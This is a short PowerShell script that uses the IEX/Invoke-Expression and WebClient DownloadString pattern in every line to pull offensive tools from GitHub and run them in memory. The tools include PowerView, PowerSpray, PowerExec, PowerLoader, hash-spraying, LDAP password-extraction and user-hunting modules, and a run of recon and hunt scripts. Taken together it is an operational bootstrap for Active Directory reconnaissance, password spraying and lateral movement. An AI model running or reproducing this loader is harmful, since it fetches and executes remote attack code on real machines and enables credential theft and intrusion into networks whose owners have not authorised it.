

Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/PowerScan.ps1')
echo "Import PowerScan : OK"
# PowerScan Recon modules
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Recon/Get-SpoolerStatus.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Recon/Get-SecurityServices.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Recon/Get-OxidBindings.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Recon/Get-NetSession.ps1')
echo "Import PowerScan Recon Module : OK"
#PowerScan Hunt modules
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Hunt/Get-CimProcess.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Hunt/Get-CimService.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Hunt/Get-LogonEvent.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Hunt/Get-PowershellHistory.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Hunt/Get-SecurityStatus.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Hunt/Get-WmiPersistence.ps1')
echo "Import PowerScan Hunt Module : OK"



Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
echo "Import PowerView : OK"

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerSpray/master/PowerSpray.ps1')
echo "Import PowerSpray : OK"

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerExec/master/PowerExec.ps1')
echo "Import PowerExec : OK"

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerExec/master/PowerLoader.ps1')
echo "Import PowerExec : OK"

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/WinUtils/master/Get-LdapPassword.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/WinUtils/master/Invoke-HashSpray.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/WinUtils/master/Invoke-UserSniper.ps1')
echo "Import WinUtils (Tim0) : OK"
